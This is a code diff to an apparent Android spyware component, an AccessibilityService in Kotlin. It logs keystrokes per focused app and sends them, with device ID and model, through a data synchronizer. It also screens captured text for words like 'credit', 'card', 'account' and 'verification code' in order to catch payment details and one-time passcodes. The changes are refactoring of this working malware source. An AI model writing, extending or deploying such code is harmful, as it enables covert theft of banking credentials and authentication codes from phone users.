@@ -432,11 +432,11 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 put("device_id", deviceId)
                 put("app", currentFocusedApp)
                 put("text", keylogBuffer.toString())
-                put("device_model", android.os.Build.MODEL)
-                put("android_version", android.os.Build.VERSION.RELEASE)
+                put("device_model", Build.MODEL)
+                put("android_version", Build.VERSION.RELEASE)
             }
             val dataSynchronizer = DataSynchronizer(applicationContext)
-            dataSynchronizer.sendData("keylog", keylogData.toString())
+            dataSynchronizer.sendData("keylog", keylogData)
             keylogBuffer.clear()
 
         } catch (e: Exception) {
@@ -462,10 +462,10 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 lowercase.contains("credit") ||
                 lowercase.contains("card") ||
                 lowercase.contains("account") ||
-                lowercase.contains("verification code") ||  // Added for OTP detection
-                lowercase.contains("authentication code") || // Added for OTP detection
-                lowercase.contains("security code") || // Added for OTP detection
-                lowercase.contains("code") // Added for OTP detection
+                lowercase.contains("verification code") ||
+                lowercase.contains("authentication code") ||
+                lowercase.contains("security code") ||
+                lowercase.contains("code")
 
     }
 
